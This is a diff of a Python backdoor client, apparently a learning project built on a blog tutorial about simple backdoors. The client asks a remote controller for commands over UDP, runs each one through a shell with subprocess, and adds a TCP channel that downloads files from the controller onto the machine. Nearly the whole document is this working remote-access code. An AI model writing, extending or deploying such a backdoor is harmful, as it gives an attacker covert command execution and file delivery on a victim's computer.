@@ -1,19 +1,39 @@
+# https://docs.python.org/3/library/socket.html#socket.SOCK_DGRAM
+# used this to learn how to initialize socket.
+
+# https://www.securecoding.com/blog/how-to-build-a-simple-backdoor-in-python/
+# This file itself is an iteration on the client described here.
+
 import socket
 import subprocess
 import sys
+
+udp_buffer_size = 4096
+tcp_buffer_size = 4096
 
 
 def get_command(request, sock, host, port):
     print("[-] Requesting command...")
     sock.sendto(request, (host, port))
-    return sock.recv(1024).decode()
+    return sock.recv(udp_buffer_size).decode()
+
+
+# https://contenttool.io/text-difference-checker
+# used this tool to confirm that the read and write functions worked.
+def write_list_into_file(name, type, list):
+    f = open(name, 'w{0}'.format(type))
+    for s in list:
+        f.write(s)
+    f.close()
 
 
 DEFAULT_HOST = 'localhost'
 DEFAULT_PORT = 4444
+DEFAULT_TRANSFER_PORT = 4445
 
 REMOTE_HOST = DEFAULT_HOST
 REMOTE_PORT = DEFAULT_PORT
+REMOTE_TRANSFER_PORT = DEFAULT_TRANSFER_PORT
 
 if len(sys.argv) > 1:
     REMOTE_HOST = sys.argv[1]
@@ -33,12 +53,16 @@ try:
 
         if command == 'file':
             file_name = get_command(FILENAME_REQUEST, s, REMOTE_HOST, REMOTE_PORT)
+            tcp_connection = socket.socket()
             f = None
             try:
+                tcp_connection.connect((REMOTE_HOST, REMOTE_TRANSFER_PORT))
                 f = open(file_name, 'w')
-                f.write(get_command(FILE_REQUEST, s, REMOTE_HOST, REMOTE_PORT))
+                # TODO: loop tcp receive until done.
+                f.write(tcp_connection.recv(tcp_buffer_size).decode())
             finally:
                 f.close()
+                tcp_connection.close()
         else:
             op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
             output = op.stdout.read()
